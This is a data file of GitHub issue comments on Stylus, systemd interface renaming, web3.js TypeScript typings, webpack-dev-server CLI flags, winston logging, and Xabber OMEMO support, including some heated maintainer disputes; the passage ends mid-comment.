stylus/openstyles/498/420055793,"Doesn't change the fact that Stylus's behavior is non-orthogonal and stupid. It keeps the style element around (but empties it) when you check the ""turn all styles off"" option. But it removes the element if you remove all checkmarks from all individual styles that were active. Fine if you don't want to fix it, just don't make up bull excuses for the differing behavior, like performance impact. The actual cost of CSS updates is in parsing the CSS text; updating internal stylesheet data structures; re-matching selectors to the website HTML; re-applying layout; re-applying painting; and finally re-applying compositing. Recreating the style element is negligible to the extreme. ",,False,False,498
stylus/openstyles/498/420139812,There's no need to change the behavior ,,False,False,498
systemd/systemd/11436/399402607,"systemd version the issue has been seen with v240 Used distribution Debian sid Downstream bug report at  reproduce the issue, create a file  containing with the mac address of your ethernet network interface. Unload the network module (in my case ), then load it again. Notice how the interface is properly renamed Now run The interface is renamed although a custom NAME has been set. ",,False,False,11436
systemd/systemd/11436/454439071,"that's a regression compared to v239, and I'm inclined to add it to the v241 milestone, given that it can mean loss of network access. @friend, @friend wdyt? ",,False,False,11436
systemd/systemd/11436/454440451,after loading the kernel module After running  ,,False,False,11436
systemd/systemd/11436/454510153,With v239 after modprobe after  ,,False,False,11436
systemd/systemd/11436/454515587,"Hmm, I wonder if this is intended effect of 55b6530baacf4658a183b15b010a8cf3483fde08 ",,False,False,11436
systemd/systemd/11436/454515683,/cc @friend ,,False,False,11436
systemd/systemd/11436/454515873,Also see #9006 ,,False,False,11436
systemd/systemd/11436/454516397,And of course #9088 ,,False,False,11436
systemd/systemd/11436/454516448,Not sure what the right approach here is ,,False,False,11436
systemd/systemd/11436/454521307,"Why it is named  when the driver is loaded?? If, the final result is  then I expect it should be always . ",,False,False,11436
systemd/systemd/11436/454521715,It should always be named  because of the udev rule. ,,False,False,11436
systemd/systemd/11436/454522213,What happens when the condition  is dropped? ,,False,False,11436
systemd/systemd/11436/454523266,"@friend does that really matter? It's a udev rule that worked for years, it shouldn't suddenly stop working. ",,False,False,11436
systemd/systemd/11436/454526617,"I've not tested that, but I guess that, because of the condition,  initially it is named to , as the initial name is . the later evaluation results , as the interface is not  anymore.  v239 or before, it is evaluated only once. So, the name was stayed at . But, v240, 55b6530baacf4658a183b15b010a8cf3483fde08 makes the rule is always evaluated. ",,False,False,11436
systemd/systemd/11436/454527487,"I think once a custom name has been set, it shouldn't be renamed by udev again. ",,False,False,11436
systemd/systemd/11436/454529656,"If I remember correctly, the original motivation of the commit is that interface name can be changed by udev rules without updating initrd or changing kernel command line. So, if my above guess is correct,,, what should we do? ",,False,False,11436
systemd/systemd/11436/454532909,"imho, revert and find another solution #9006 ",,False,False,11436
systemd/systemd/11436/454535318,@friend a default policy like /lib/systemd/network/99-default.link should never trump explicit user configuration. ,,False,False,11436
systemd/systemd/11436/454544042,"@friend There is no split between ""explicit user configuration"" and the rest. Files like  are named this way to have the lower priority. But there is no magic of ""oh, this was set by the user, let's not touch it"" anywhere.  The problem with trying to make a division like that is that nobody seems to ever agree what is ""user"" configuration, and what is ""explicit"".  Current approach of simply executing the configuration as we find it is much clearer and sustainable. #9006 was applied precisely because users were creating configuration and were peeved that some very specific parts of that configuration are not applied. The rules in the bug report were relying on an implementation detail of the rule engine, and changing this implementation detail is something that we are allowed to do. The rule should never have had  if it was supposed to apply also after the interface was renamed. Current behaviour seems correct to me when the device is called , there's just one rule that applies to the devices, and when  fires off, we execute all rules that apply. This is also much nicer for the user, because they can create configuration and apply it, without jumping through hoops to reset the state. ",,False,False,11436
systemd/systemd/11436/454544525,"It's not nicer to users, as it breaks existing user configurations. Which is bad ",,False,False,11436
systemd/systemd/11436/454544937,I'm amazed that I have to point this out.... ,,False,False,11436
systemd/systemd/11436/454546312,"Not every facet of program behaviour is guaranteed to be stable. Generally, only things that are documented are promised to be kept unchanged. Is the fact that link renames are applied only once documented anywhere? You seem to suggest that we should never change any user visible detail. I think this user rule was in error, and it worked for a while by luck, and now it doesn't. This happens all the time. ",,False,False,11436
systemd/systemd/11436/454548298,I guess I'll stop filing bug reports ,,False,False,11436
systemd/systemd/11436/454550222,"wouldn't it make sense to only apply  matching to the kernel-assigned name, not a potentially renamed name? ",,False,False,11436
systemd/systemd/11436/454559824,This doesn't seem to have ended well. ,,False,False,11436
systemd/systemd/11436/454581369,"From the peanut gallery... Would it make sense to somehow record the original name of this interface and match  against that name as well? When reading the rule from the OP, that was my impression of how that should have worked (and the previous one-rename rule was a good approximation of it...) Not really sure whether that makes sense, would be feasible and would address the other issues that commit was supposed to fix... ",,False,False,11436
systemd/systemd/11436/454585896,"Urks, I find this breakage quite unfortunate I must say. I mean, writing a rule that matches effects of a previous rule (like the one debian is using there) is probably not a great idea (rules really should match stuff that is not going to change for a device, so that they are idempotent), but I am not sure that simply breaking systems like this is a good idea. I don't have a strong opinion on the way out, but I am slightly leaning towards reverting the patch and simply asking downstreams to drop any rules that rename ifaces whatsoever from their initrds, as that means the host's policy will never be enforced. I mean, afaiu the patch was done precisely to ensure that host policy applies if initrds already renamed devices, no? I mean, users/downstreams assumed that these rules where OK, and we probably should tell them they are a bad idea, but also, I think we shouldn't break so many installed systems this way... Another idea might be make it configurable in the .link file whether to rename already renamed interfaces, with a default to on. Then, change our 99-default.link file to turn off the option. This way, .link files supplied by users will by default override everything, but the fallback one we provide won't. Other ideas, opinions? ",,False,False,11436
systemd/systemd/11436/454586278,"i mean, with the naming scheme cmdline option and stuff we now go into great lengths to stabilize names over releases, it would be a pity if we'd then break existing rules so galantly (even if they aren't written in particularly good style)... ",,False,False,11436
systemd/systemd/11436/454598207,"The current documentation does not specify whether user modifications are read, and there are two factors suggesting they shouldn't  The name The existence of a NAME variable for matching against userspace changes.  Honestly, having a variable named KERNEL map to a value provided by userspace is weird. ",,False,False,11436
systemd/systemd/11436/454641322,"Hmm, we have already documented that implicitly...  least, we need to update this. ",,False,False,11436
systemd/systemd/11436/454650722,@friend's proposal is implemented in #11443. ,,False,False,11436
systemd/systemd/11436/454709094,"userspace, no renaming is performed. The available policies OK, that is enough for me to consider the previous behaviour documented. So I agree that we should preserve compatibility for this. I like this approach. The question is whether to default to ""on"" or ""off"" with current link files. If we default to ""off"", we preserve more backwards compatibility. If we default to ""on"", we get saner behaviour. ",,False,False,11436
systemd/systemd/11436/454742671,"Or, how about disabling the new behavior if naming scheme is specified earlier than v240? ",,False,False,11436
systemd/systemd/11436/454748619,@friend interesting idea. Maybe like this if naming scheme is &lt; v240 we default to RenameOnce=yes and otherwise to RenameOnce=no (and 99-default.link would set RenameOnce=yes either way) ,,False,False,11436
systemd/systemd/11436/454971826,"@friend Please go talk to Linus Torvalds. If it works today and you make a change to break users, you are in the wrong. I should hope you wouldn't need yelling at to understand that. Software developers need to internalize this and abide by it at all times, life would be much easier. ",,False,False,11436
systemd/systemd/11436/454972565,"Please don't post offtopic comments. (This is making rounds elsewhere, locking this for now might be best). ",,False,False,11436
systemd/systemd/11436/455332624,"BTW, for those coming late, a good fix (including a revert) has been merged now. I think all should be good now. ",,False,False,11436
web3.js/ethereum/1248/284299162,"Hello, Web3 Typescript definition on branch 1.0 doesn't contain ""default export"". After importing ♠import Web3 from 'web3';` I got this issue  Module '""xxxx/node_modules/web3/index""' has no default export. ",,False,False,1248
web3.js/ethereum/1248/353787208,"the type definition reflects the current module implementation line 78 Based on typescript document, it is recommended to adopt module-class, which is why the type is exposed with ""="" and not default. We have been going back and forth on this issue as you can see with #1184, which was exactly to undo the default import that undo the ""="" earlier...  I am sure we don't want to keep repeating this cycle,  will the following import syntax work for you? ",,False,False,1248
web3.js/ethereum/1248/353955671,Thank you. ,,False,False,1248
web3.js/ethereum/1248/353972813,"Using ""require"" keyword, I got this error on compilation I use typescript  2.6.2 ",,False,False,1248
web3.js/ethereum/1248/354118488,"web3.js is still using es5 module system, so it's best to use the compiler option that supports it... try module ""commonjs"" ",,False,False,1248
web3.js/ethereum/1248/354565469,"Doing  works for me in version 1.0.0-beta.26 but when i upgrade to 1.0.0-beta.27 I receive the error mentioned in this post. I could use the lower version but i noticed that the method for viewing pass events has changed in .27. IN version .26 the passed events can be viewed by invoking  but in .27 you have to call ; Please resolve soon, thanks ",,False,False,1248
web3.js/ethereum/1248/354568701,seems like @friend  has a PR for this ,,False,False,1248
web3.js/ethereum/1248/356094710,"here is the bottom line  works for  but breaks  works for  but breaks   If you guys look at the commit history, you can see that we have tried both export styles multiple times because every time you switch to one the other camp complained. Giving the module can't be exported both ""="" and ""default"", we have to choose one... but which one? I think we all agree that the type definition should closely reflect the original package implementation current web3's js implementation uses ""export ="", according to typescript official doc, it is recommended to adopt type definition with ""export ="" (see here). This tips the scale for . ",,False,False,1248
web3.js/ethereum/1248/368648735,"PR1249 made it ""export default"" again in version 1.0.30 . Doesn't work with commonjs anymore. ",,False,False,1248
web3.js/ethereum/1248/375319950,Just use ES Modules since it's JavaScript's official module system and stop changing it all the time. It's a breaking c ,,False,False,1248
web3.js/ethereum/1248/385207638,What I ended up doing to stop typescript from complaining and still have type definition and autocompletion is ,,False,False,1248
web3.js/ethereum/1248/386765112,@friend was able to make it work as follows ,,False,False,1248
web3.js/ethereum/1248/392553060,From Typescript docs Web3 uses  so the correct way to import it in Typescript is ,,False,False,1248
web3.js/ethereum/1248/442713942,This should be fixed with the PR #2000 thanks to @friend who is writing the typings! ,,False,False,1248
web3.js/ethereum/1248/442734463,@friend Which typings are you talking about? ,,False,False,1248
web3.js/ethereum/1248/442761668,@friend He has currently just implemented the typings for web-utils and there is an open PR for web3-bzz maybe you can help him or move the typings from DefinitelyTyped into the web3.js repository. I would like to have them directly in the repository because this way I can guarantee that they are always up to date. The issue above should be fixed because of the refactoring and the typings Josh is writing but I will proof it before I merge the PR into the 1.0 branch. ,,False,False,1248
web3.js/ethereum/1248/442775398,"I repeatedly said and it is best practice to only have the type definitions at definitely typed. You should never again bring type definitions back into this very code base right here. The only exception for this rule is, if you actually write the code in typescript. ",,False,False,1248
web3.js/ethereum/1248/442781472,"@friend Hey dude, I have to say I completely disagree. I do agree types say quote  - but this would work in a standard  project. At the moment the typing's NEVER get kept in date, someone does a PR in  and you can not force them to do another PR in . This then causes a huge knock effect for all the typescript devs when new versions are released as the types just do not match up. I have had this about 40 times and only finding out the types are incorrect by having to write full unit tests. If it was actually in the repo itself you can enforce contribution instruction to make sure the typing keep in date all the time.  I seen other repos like BigNumber -( do this due to how impossible it was to manage it being in 2 separate repos. At the current time the  are out of sync in the  lib, i have not checked the others but the entire development experience trying to work in  with web3 is too hard at the moment due to the amount of changes. As the main developers work in   is 2nd thought and it should be part of the entire development structure while writing new things in web3 itself. We should also be able to release types + web3.js at the same time at the moment we have to wait for the  PR to be approved which is out of our control. This solution will mean updating methods in the future and updating it's typing will be super easy for all the maintainers as it's in 1 repo. It will also mean the typing's will never be out of sync due to contribution guidelines but still versioned nicely.  I know a lot of people may just use  but as a regular  developer using these library i believe this would be a very good way to start improving this, and a lot of the people i have spoken to about this have agreed. I just trying to make this seamless, bringing easier development for the TypeScript devs that's all. Like i said i can tell you a thousands times where the types reflected are so out of date. This would solve a lot of issues i see raised with typing's and bring it all in with 1 install command. Let me know your thoughts )  Thanks  👍 ",,False,False,1248
web3.js/ethereum/1248/442784961,"I removed the type defintions after a long discussion because they were broken (as in ""You were not able to use  in a typescript project without monkey patching the broken type defs, shipped with ) They were broken because there are no automated tests for the type definitions in this repo here. There cannot be. Definitely typed has such tests. I agree that it is a slow process but the process you are suggesting will make things even worse Everyone who is making a contribution to  will have to be a typescript pro from now on. Because as you are saying you will reject every PR without an update to the type defs. At the same time you do not even code the library in typescript! So I have to live with the sadness that I have to write my contributions in JS and then I have to type them by hand afterwards. What a clusterf**k. There are two possible and acceptable ways to proceed  When the API has changed, make a PR to DT fast and live with the fact that sometimes the type defs are outdated for a couple of days. Also stop making big changes to the API. Start writing the code in typescript (which can be done incrementally) and autogenerate the type defiintions.  All other approaches are going to fail and only cause misery. ",,False,False,1248
web3.js/ethereum/1248/442785983,"One other thought to keep in mind This library is written in Javascript, because the people contributing to it are not able to write Typescript code. Now you want them to review type definitions for a usage of this library in Typescript projects. You see the problem? ",,False,False,1248
web3.js/ethereum/1248/442788429,"Thanks for your quick response @friend. I completely understand what you are saying.  So I have to live with the sadness that I have to write my contributions in  and then I have to type them by hand afterwardsJS@friend - I think any  can write standard type definitions with a little bit of support, even if this is fixed by someone who could again i can't see it being a problem. Like i said we don't have loads of regular contributors anyway. ",,False,False,1248
web3.js/ethereum/1248/442788474,And one more thing PRs to DT get merged pretty quickly when they are good. Most of them aren't though. ,,False,False,1248
web3.js/ethereum/1248/442789555,"This is a false assumption. First you code javascript. Then you code typescript. Then you learn how to produce type definitions. Devs who are able to write type defintions are a subset of the devs who have mastered Typescript, not the other way round. This is an opinion of mine and we reached a point were we have two different opinions and I have not further arguments to give. I made my point. Tipp ",,False,False,1248
web3.js/ethereum/1248/442790744,@friend but we have under 10 regular contributors.. do you not think this would bring more good then bad? Say yes some  need some support with types but with not many people actually contributing this should not be that hard to maintain. The main advantages it brings are huge over the valid points you have stated. For the over 200k weekly downloads web3 gets I think this could solve a lot of  pains they have. This could be the first step and maybe in the future web3 is rewritten into  but we have to start somewhere. Thanks a lot for your view and taking time to discuss! ,,False,False,1248
web3.js/ethereum/1248/442791564,I get your argument These 10 contributors should be able to learn typescript. I disagree with your conclusion Lets make them learn typescript and then maintain the type definitions for this JS code base. I think the only conclusion can be Lets make them learn typescript and write everything in typescript. With  you can just rename every file to  and be done. Project is now in typscript. ,,False,False,1248
web3.js/ethereum/1248/442792624,I think some other milestones have to be reached first before this gets done like actually release of  none beta. I am a big supporter of getting  in  and would happily go through the entire thing and change everything to  but i think that's a bigger discussion to have. Really appreciate your view though!  Cheers Levin 👍 ,,False,False,1248
web3.js/ethereum/1248/442795190,"I am not voting to move this here to typescript. I want to show that your idea to maintain the type defs here is a mistake. Publish type definitions with your package iff your is written in typescript. Let others maintain and publish the definitions iff your package is not written in typescript. As this package is not written in typescript (and possibly never will be), it is infeasible to maintain the type defs here. End of story. ",,False,False,1248
web3.js/ethereum/1248/442795576,"And one thing about the argument with BigNumber.js The pain you experienced was not because the type defs where maintained in another repository, but because bignumber.js is not written in typescript. ",,False,False,1248
web3.js/ethereum/1248/442796227,"A popular example of a lib that's not written in TS and maintains its own type defs is Redux - it seems to work fine for them. Redux is way simpler than web3.js, but it also has way more contributors and downloads than web3.js. ",,False,False,1248
web3.js/ethereum/1248/442797557,That might be. But it is against best practice and I explained in detail why the categorical imperative says it is a bad idea. Only because some people do it does not mean that we have to do it too. ,,False,False,1248
web3.js/ethereum/1248/442802967,"Who defined the best practice you're talking about? One of the most important libs in the industry does it differently without problems, so I don't really see how it's against ""best practice"". TypeScript docs don't discourage such approach either, so I think that it's just your opinion and not a sacred truth that we should follow. I've used web3.js with TypeScript and each time I've written my own typings for things I needed, because the official ones were just plain wrong and not helpful at all. Bigger Ethereum projects like 0x also have picked this route (as seen here) to avoid the hassle of working with official web3 typings from DefinitelyTyped. ",,False,False,1248
web3.js/ethereum/1248/442803322," With this view we will never ever have solid types for  so  development with it becomes unstable or having to use  everywhere 👎 The likes of Redux do this because of the  it causes relying on others to maintain the types, and as @friend said they have far more contributors and over 2 million downloads a week, we should learn from people who have gone through the pains.   We are in a world where  development is taking over so i thought  would start adopting to supporting in-house types. This would of been a great start. Again i see no reasons that you stated which makes it  bad, in my view the positives overweight the negatives by far. If  do not support  out the box people will have to start using other  which do which i would hate. Anyway discussion over - see ya! ",,False,False,1248
web3.js/ethereum/1248/442803978,@friend I'd suggest locking this thread to avoid further flamewars. ,,False,False,1248
web3.js/ethereum/1248/442804560,Please read the docs more carefully. I quote (again and again and again) ,,False,False,1248
web3.js/ethereum/1248/442848718,"@friend not trying to pick sides here, but you must agree that breaking web3.js for typescript users on a regular basis is not a good thing?  Regardless of what the TypeScrypt docs say. For better or worse, a lot of people are using TypeScript that also use web3.js. It sounds to me like the only option here to prevent the regular breakage is to include the ts file in this repo so it's always in sync. If the contributors to this repo don't want to update the types file, let some of the people on this thread help whenever a PR comes in to ensure it gets updated properly before merging, it would probably only take a few minutes of a ""TypeScript pros"" time to check the types file for each PR. ",,False,False,1248
web3.js/ethereum/1248/442876694,"You all want to have typings that are up to date with the current interface of the library, right? Guess what There is only one (just one!) way to achieve this Implement the library in typescript and generate the typings automatically. Even if you maintain the typings here, they will be out of sync all the time. As I said, the typings in this repo were broken. There are several reasons why this cannot work  Pull request reviewers do not understand typescript and cannot review whether or not the changes to the typings are correct. The typings will not be tested. So even if the reviewer is a typescript pro, they are human and will overlook things. (DT tests all typings automatically in CI!!!!) Someone makes a really nice pull request. It gets merged because javascript users want the new feature. Nobody cares for the update to the type definitions because the contributor with the pull request is not able to write them and nobody else comes to the rescue in time.  and 3. is the same for DT, but 3 is not. You will not achieve what you are looking for when you maintain the typings here. Also who of you has made a contribution to DT? It is super easy. There is nothing to fear. The review process is heavliy streamlined and fully automated.   So my point is You all push for maintaining the typings here but you will not achieve what you want to achieve. The type definitions will be out of sync all the time not matter what until this is rewritten in typescript. ",,False,False,1248
web3.js/ethereum/1248/442877381,"Unfortunately in the typescript docs they do not explain why you should publish the typings via DT when you write your package in Javascript, but I think I gave enough reasoning. Additionally to that Why do you think that they recommend that? ",,False,False,1248
web3.js/ethereum/1248/442880449,I think I do understand TS it is not that rocket science thing to do types. Maybe we could test them in our CI too. This should not happen if I review a PR. I think you should answer this question ) ,,False,False,1248
web3.js/ethereum/1248/442885264,"So you will from now on personally review all PRs? That is going to scale well. Yes. That is quite easy. What is more easy though is to rewrite the whole codebase in typescript. It will happen. Or you will drive away open source contributors because they create a valid PR which never gets merged because ""we are still waiting for the typings"". I did explain my thinking. Three times. I repeat myself. People say that I am not right. I want to here their train of thoughts. ",,False,False,1248
web3.js/ethereum/1248/442885600,And another question for you all What about flow? Should we add flow typings too? Facebook is using flow! ,,False,False,1248
web3.js/ethereum/1248/442889987,Yes thats what I'm doing currently and will do it as long as I work for this lib. I think we can test them with for example  I have to write the types by my self and I think that will not happen so often. No you didn't you were just quoting the TS documenation but you never really explained the thoughts behind it. The TS documentation does not explain it either. I think I could add for example this  to the publish process to generate them. Idk how good this is but maybe that could be a solution. I'm not saying that I like one of the solutions more then the other but until now I can't see a reall killer argument that we should have them on DT. I think thats more an ethical thing. 😅 ,,False,False,1248
web3.js/ethereum/1248/442913265,Just do what you want if you do not want to listen to reason. This is going to be a fuckup! At least I told you so. ,,False,False,1248
web3.js/ethereum/1248/442913894,"oh and  has their own types and it's a JS project   and  both a ""fuckup""? @friend I have stated valid points here.. you have not really replied to any of them. 👍 ",,False,False,1248
web3.js/ethereum/1248/442916455,I understand your argumentation. You will from now on review every pull request and your super powers will make sure that every change to the API of the library or any of the sub-packages will be reflected 100% in the typings here in the repo. I say You will fail! And you say No I have my superpowers. Which is fine. But I will not waste more time on this. Do it then. It will be painful and hard and you will fail. Lets talk again in a year. ,,False,False,1248
web3.js/ethereum/1248/442916831,"And btw If at some point you decide to rewrite the whole codebase in TS, that does not count as a success, but a fail too, right? Because that is what you want to avoid with your approach. ",,False,False,1248
web3.js/ethereum/1248/442920710,"This is already happening @friend , this is what this discussion is all about. Apparently all of us TypeScript users are ""script kiddies"" and yes, we're complaining about this library breaking every time you update it. If you want us ""script kiddies"" to stop complaining, then just do the right thing and fix the problem. You have a bunch of people saying they'll even help fix the problem, which you don't seem to want to accept. 🤦‍♂️ ",,False,False,1248
web3.js/ethereum/1248/442917416,"Ah and I forgot to predict something You will have hundreds of issues from Windows-using script kiddies who cannot use Typescript right but will blame you for ""incorrect typings"". They will all go on the backlog and jam it. ",,False,False,1248
web3.js/ethereum/1248/442922846,"I maintain (with others of course) the  package. If the maintainers of  would drop typescript support, they could just close every typescript related issue and save time and money. And I repeat If you all want that this library supports typescript itself, then JUST WRITE IT IN TYPESCRIPT! ",,False,False,1248
web3.js/ethereum/1248/442923179,"Well, i've been having this page opened for the whole afternoon and i must admit i'm quite amazed by how this has gone to some flames. As JS &amp; TS developper, in normal times, i would have been supporting separated repo for providing types,  as requested by @friend, as i rather prefer avoiding to have any broken type provided by the original repo, third-party packages being easy to remove without touching web3 original code. However, as i read the answers it seems quite technically feasible to ensure types are correctly written before merging any PR, as @friend provided tools &amp; examples of others projects  doing so. Comment from @friend here   also makes me think that rewriting web3 into a TS form might be quite faster as it could be expected. If web3 dev team commits to review type definitions while a typescript migration is being built, i'll definitely support it, they made their point. @friend  i don't think it's about winning or failing here but rather having a collective conversation about how to do it the best way possible. Too bad to have thrown useless flames for that. In any case, and still, thanks for providing . Much datalove ",,False,False,1248
web3.js/ethereum/1248/442923808,If everybody here speaks Typescript then there is no reason not to write this library in Typescript. I repeat again One can incrementally migrate a library to typescript. But that requires some Typescript skills. ,,False,False,1248
web3.js/ethereum/1248/442923769,@friend I think people who do this like  and  are doing just fine with this approach. Big repos with millions of downloads a day do this and succeed without  😃 I maintain (with others of course) the @friend/web3 package.tstsjsts` will come 😄. @friend will have a roadmap for this. Thanks for the good discussion though @friend i do respect your views and no hard feelings 👍 ,,False,False,1248
web3.js/ethereum/1248/442925325,I will lock this issue now because I think we already seen all the arguments. Thanks everyone for the effort to be a part of this discussion! ,,False,False,1248
webpack-dev-server/webpack/1220/350172660,The code in  would seem to disagree with this assessment.  example for  also works as expected. And the docs don't show the flags as options that you expect to be working. Your  should be in a config. This looks like a classic case of misuse. ,,False,False,1220
webpack-dev-server/webpack/1220/350215313,@friend is the CLI's  output incorrect or are my expectations incorrect? ,,False,False,1220
webpack-dev-server/webpack/1220/280324189," Operating System  Node Version  NPM Version  webpack Version  webpack-dev-server Version ,  (both)     [x] This is a bug [ ] This is a feature request [ ] This is a modification request  Code Expected Behavior Command line arguments for  should be used Actual Behavior I don't think they are. For Bugs; How can we reproduce the behavior Invoke from CLI as above. Notes Got here from ",,False,False,1220
webpack-dev-server/webpack/1220/350227036,"Can't speak for most  consumers, but personally i tend to reference  pages and  output 1st and web documentation if I need further explanation. My expectation was that CLI flags take precedence and were reconciled with config somehow. I think myself (and potentially others) are either misinterpreting the  output or perhaps the -related flags indicated from  are inaccurate? ",,False,False,1220
webpack-dev-server/webpack/1220/350275103,"That's a personal choice of course, but I'd highly recommend reading the actual docs next time before submitting an issue for any project. I don't know as if it holds true that  and  are the definitive source of info for modern-day tools outside of some hardcore CLI idealists. None the less, what we have here is a display bug resulting from combining 's CLI configuration with  to get some common config for free. See  that's adding flags from  that  doesn't support. The docs for this module are correct, the output on the CLI is not. We'll track a new issue to see if we can resolve that. But the takeaway here is to always check the actual docs. ",,False,False,1220
webpack-dev-server/webpack/1220/350285253,"I'd neglected to put this in the response above, but want this to stick out for others who might happen across this issue in the future Note the first three lines of the CLI output The important bit there is  as the CLI is pointing users towards the proper docs even in the  output. ",,False,False,1220
webpack-dev-server/webpack/1220/356175044,"@friend Thanks for taking the time to develop a valuable tool and taking the extra effort to document it. What @friend did may not be how you operate, but it is a very common pattern for a huge group of users ""out there""  If you are on a command-line interface, the first thing you do is ""man tool"" or ""tool help"", ""tool -h"", etc. And if the output is too large, the first natural thing to do is grep the output or ""Cmd + F"" Also, properties from the CLI overriding default values or configurations is the common behavior for most CLI tools, it's the ""least surprising behavior""  You are of course free to deviate from the pattern, may I suggest to simply remove the whole output of ""--help"" and replace it with the ""Usage"" link? That would be easier than trying to change people to abandon behaviors that have been proven useful since at least the late 1970's ",,False,False,1220
webpack-dev-server/webpack/1220/384660043,@friend seriously? ,,False,False,1220
webpack-dev-server/webpack/1220/384661370,@friend replies of that nature are not helpful and do not contribute to the discussion. please refrain in the future. ,,False,False,1220
webpack-dev-server/webpack/1220/384665003,"@friend let me then elaborate on it so it valuable to the discussion. Keeping documentation in sync with the actual behavior/options of the tool ( be it online or in the tool itself) is fundamental and not something that only ""some hardcore CLI idealists"". It is simply quality of your product. I see you are listed as the 3rd most active contributer on the project and seeing you writing something like that is just bad for the project itself and the JS community in general. This is not idealism is QA! ",,False,False,1220
winston/winstonjs/1158/277869345,"I'm having a lot of issues testing Winston satisfactorily.  I blame this on the lack of promises used, the atypical style used in the code (readability), and the use of the async file calls/undocumented event emitters. My use cases are very common.  I want to author a test that verifies a log file has been created, and it has been written to.  I've spent literally hours without success figuring out what Winston is doing.  That really is not good. Net effect my perception is that Winston has a lot of bells and whistles (I still don't want to reinvent log rotation), but it's probably contributed to by too many people, its issue log has some serious issues noted, and it fails to implement simple cases. ",,False,False,1158
winston/winstonjs/1377/335193249,"  Please tell us about your environment   version? [ ]  [x]      outputs v10.4.1 Operating System? macOS High Sierra v10.13.5 Language? ES6  What is the problem?  I've followed the [upgrade to 3.0]( doc, and when I was done, my logs were broken.  V2 supported multiple arguments to log functions, and using common format options, pretty printed Objects/Arrays/Errors nicely.  So these logs worked in V2    &lt;img width=""415"" alt=""screen shot 2018-06-24 at 18 51 16"" src="" width=""499"" alt=""screen shot 2018-06-24 at 18 52 47"" src="" width=""1083"" alt=""screen shot 2018-06-24 at 18 51 47"" src="" in V3, multiple arguments are no longer supported, only  is supported and only as an Object. Plus the equivalent formatters do not yield the same result.    &lt;img width=""551"" alt=""screen shot 2018-06-24 at 19 27 33"" src="" if I add the  formatter, it's still not the same  &lt;img width=""817"" alt=""screen shot 2018-06-24 at 19 28 02"" src="" What do you expect to happen instead?    The migration doc should mention this fundamental change in behavior and how to resolve it Multiple arguments are treated differently Objects as  are not pretty printed Error Object is ignored (I saw there's an open issue for that) Formatters order matters   I think Winston should support the multiple arguments notation, as it is a very common usage of  and really is much easier to use when you need to log a string and then an Object, etc. (specifically when using the Console transport). The new formatters should yield the previous behavior when using the same setup    ",,False,False,1377
winston/winstonjs/1377/399971768,plus one The documentation is a bit superficial regarding  and the provided examples such as this one do not result in the expected output. ,,False,False,1377
winston/winstonjs/1377/399997493,PR would be welcome to update that example @friend. Will take a look at this in depth and see what we can do to make the transition easier. ,,False,False,1377
winston/winstonjs/1377/399997894,"Also @friend – winston does support the multiple argument notation, it's simply not enabled by default because it is a performance hit and as such opt-in. Use . ",,False,False,1377
winston/winstonjs/1377/399999465,@friend I can gladly post a PR but currently I'm unable to understand how to obtain the standard notation. I tried adding  I just get a weird message like the ones shown by @friend. ,,False,False,1377
winston/winstonjs/1377/400002365,I was making the same comments (objects/arrays) aren't formatting the same in the Gitter chatroom.  Seems that the previous options.meta isn't treated the same way.  Would be great to understand the differences and how to fix moving forward. ,,False,False,1377
winston/winstonjs/1377/400662072,"plus one After maybe 2 hours of trying to obtain the same logging format in V3 as in the previous version, I have to say I have to downgrade. I like the custom formatter and format.combine and everything, but either  coloring doesn't work simple format output doesn't work (no JSON) printing out objects (JSON) doesn't work - I don't see any reason why use custom formater with JSON.stringify or combination of the above  I just want logger.error(""error""), logger.info(object), logger.info(array) and no hustle. ",,False,False,1377
winston/winstonjs/1377/400665179,All of those features work. If you'd like to share a code sample along with your shade that would be much more constructive. ,,False,False,1377
xabber-android/redsolution/540/105175969,The offspring of this GSOC XSF projects is OMEMO. An axolotl and PEP based open standard for end-to-end encryption. Would be great to see support for it in Xabber. ProtoXEP  info ,,False,False,540
xabber-android/redsolution/540/147160733,"Finally, security has arrived in IM without compromise. Please add this protocol! I will switch back from Conversations when it comes. ",,False,False,540
xabber-android/redsolution/540/273843024,"I'm working on an OMEMO Smack module as part of my bachelors thesis, so Xabber might use this in the future. ",,False,False,540
xabber-android/redsolution/540/274489082,"yes, please support OMEMO in xabber. ",,False,False,540
xabber-android/redsolution/540/283202131,"Thanks for all the fish, but the addition of this fish would be more better. ",,False,False,540
xabber-android/redsolution/540/283598612,I'm considering to implement OMEMO in Xabber using smack-omemo and smack-omemo-signal. How can I get further in touch with you? ,,False,False,540
xabber-android/redsolution/540/334990060,"Looks like smack-omemo has been implemented, any progress on it in Xabber? ",,False,False,540
xabber-android/redsolution/540/334990411,"We have some other more immediate plans. We have 100% confirmation that at least 80-90% of Russian Xabber users use it for buying drugs. And since our crowdfunding campaign goes rather slow,we... Let's say, not too interested into stretching ourselves and give one more encryption method for this cathegory of users. In fact, we are considering removing Xabber from Russian play store at all,we have some very unwanted attention from authorities because of OTR, but to add yet more to it... No. Definitely not now. If patreon campaign will reach certain milestones,maybe. ",,False,False,540
xabber-android/redsolution/540/334991970,Can you explain how unwanted attention by authorities is affected by crowdfunding efforts? ,,False,False,540
xabber-android/redsolution/540/334993018,"@friend why do you provide your own Jabber service, then? If you don't have a central server like xabber.org, it would probably be easier to tell the authorities that you're not the ""information disseminator"" (or how does ""организатор распространения информации"" actually translate to English). ",,False,False,540
xabber-android/redsolution/540/334993613,"Not good. Time to setup a warrant canary, is not it? Also with this background the crowdfunding campaign will certainly not raise more money. If we have to fear interference of some authorities. Also, you hopefully know that this argumentation is definitively crap. And unless you track your users (which I don't think so) you cannot know what your users are doing with your messenger. So where did you got this number? ",,False,False,540
xabber-android/redsolution/540/334995574,"@friend that's easy. On one hand we have some difficulties with authorities who vaguely threat they can destroy my business in an instant (it's very easy in russia. police just storms the office, takes away all computers, returns it after 3 years, if ever, end of story). On the other we have an audience of users who constantly moan of a feature I don't personally need at all, and pay me nothing. If we put these two together, a clear solution is to screw Russian audience, I don't really care what client they will use. @friend this argumentation is based on facts. Over the years we have seen just so many help requests on our email support in so many languages, requests in Russian stands out in it by some very unusual metrics rarely present in other groups - phony names and inadequate requests, users clearly have no idea how XMPP works. Plus we've recently launched our own XMPP service that requires users to provide name and surname. And guess what, out of several thousands registrations Russian locale names and surnames once again look very... different from Germans. So, since I have zero sympathy for junkies, and Russian audience is proving to be worthless to me, while giving me some headache. So, I think we'll be removing Xabber from Russian Google Play. And once again on OMEMO so far I'm the only one who paid for development of Xabber, I had some spare money to create an app that I like. I like current Xabber, and I have some plans to redesign it to make it even better looking. I have some plans to create several protocols to make XMPP work much better on mobile devices. I have 